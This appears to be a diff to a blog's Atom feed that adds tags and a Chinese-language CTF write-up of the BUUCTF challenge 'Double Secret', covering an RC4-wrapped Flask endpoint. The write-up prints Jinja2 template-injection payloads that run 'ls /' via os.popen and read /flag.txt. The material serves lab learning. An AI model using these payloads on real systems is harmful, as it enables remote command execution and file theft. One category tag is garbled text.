@@ -99,6 +99,14 @@
     <category term="FFI预处理" />
     <category term="thinkphp3.2.4" />
     <category term="jwt" />
+    <category term="sql二次注入" />
+    <category term="MD5碰撞" />
+    <category term="jwt密码爆破" />
+    <category term="cms" />
+    <category term="create_function()函数" />
+    <category term="sqlע��" />
+    <category term="jwt身份验证" />
+    <category term="rc4" />
     <entry>
         <id>http://odiws.github.io/2024/09/25/DDCTF2019-homebreweventloop/</id>
         <title>[DDCTF2019]homebreweventloop</title>
@@ -107,5 +115,47 @@
         <category term="buuctf" />
         <category term="flask" />
         <updated>2024-09-25T11:53:31.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://odiws.github.io/2024/06/13/Secret/</id>
+        <title>’[CISCN2019 华东南赛区]Double Secret‘</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/06/13/Secret/"/>
+        <content type="html">&lt;h2 id=&#34;ciscn2019-华东南赛区double-secret&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn2019-华东南赛区double-secret&#34;&gt;#&lt;/a&gt; [CISCN2019 华东南赛区] Double Secret&lt;/h2&gt;
+&lt;p&gt;由标题可以知道：有两个 secret；尝试 /secret&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;网页显示是给个参数他就会给你加密（但是却是解密）&lt;/p&gt;
+&lt;p&gt;有两个 secret 可以在参数这里猜:&lt;/p&gt;
+&lt;p&gt;加？secret=12345 发现错误：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现是 ssti 报错：盲猜 jinja2：&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1hcHAtODU1Zi5weQ==&#34;&gt;找 app.py&lt;/span&gt;：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-pyhton&#34;&gt; if(secret==None):
+        return &#39;Tell me your secret.I will encrypt it so others can\&#39;t see&#39;
+    rc=rc4_Modified.RC4(&amp;quot;HereIsTreasure&amp;quot;)   #解密
+    deS=rc.do_crypt(secret)
+ 
+    a=render_template_string(safe(deS))
+ 
+    if &#39;ciscn&#39; in a.lower():
+        return &#39;flag detected!&#39;  
+    return a
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以发现是加了一个 rc4 的解密，密钥为：HereIsTreasure&lt;/p&gt;
+&lt;p&gt;我直接搞个加密 rc4 的密钥一样就可以了：&lt;/p&gt;
+&lt;p&gt;payload：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls /&#39;).read()&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;读 flag.txt  payload：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;/flag.txt&#39;).read()&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;但是要加一个 url 加密，在加一个加密所有字符（因为好像直接输入会丢字符）&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="flask" />
+        <category term="ssti" />
+        <category term="rc4" />
+        <updated>2024-06-13T11:56:57.000Z</updated>
     </entry>
 </feed>
